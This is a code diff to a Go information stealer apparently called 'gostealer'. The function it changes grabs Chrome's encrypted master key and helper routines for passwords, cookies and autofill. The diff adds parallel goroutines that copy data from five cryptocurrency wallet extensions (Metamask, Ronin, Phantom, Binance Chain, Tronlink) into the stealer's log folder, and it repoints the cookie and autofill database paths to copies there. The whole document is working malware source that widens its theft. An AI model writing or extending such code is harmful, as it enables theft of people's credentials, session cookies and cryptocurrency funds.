@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"path"
+	"sync"
 
 	"github.com/4kord/gostealer/utils"
 	"github.com/4kord/gostealer/utils/decrypt"
@@ -13,6 +14,8 @@ import (
 )
 
 func Chrome(browserPath, logFolderPath string) {
+	wg := sync.WaitGroup{}
+
 	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)
 
 	err := os.WriteFile(path.Join(logFolderPath, "raw", "chrome_masterkey.txt"), browserKey, 0644)
@@ -39,8 +42,28 @@ func Chrome(browserPath, logFolderPath string) {
 		log.Println(err)
 	}
 
-	wallets.CopyMetamaskChrome(browserPath, logFolderPath)
-	wallets.CopyRoninChrome(browserPath, logFolderPath)
+	wg.Add(5)
+	go func() {
+		wallets.CopyMetamaskChrome(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyRoninChrome(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyPhantomChrome(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyBinancechainChrome(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		wallets.CopyTronlinkChrome(browserPath, logFolderPath)
+		wg.Done()
+	}()
+	wg.Wait()
 }
 
 func getChromePasswords(browserPath, logFolderPath string, key []byte) string {
@@ -94,7 +117,7 @@ func getChromeCookies(browserPath, logFolderPath string, key []byte) string {
 		return ""
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "Network", "chrome_cookies")
+	sqllitePath := path.Join(logFolderPath, "raw", "chrome_cookies")
 
 	var data string
 
@@ -138,7 +161,7 @@ func getChromeAutofill(browserPath, logFolderPath string) string {
 		return ""
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "chrome_web_data")
+	sqllitePath := path.Join(logFolderPath, "raw", "chrome_web_data")
 
 	var data string
 
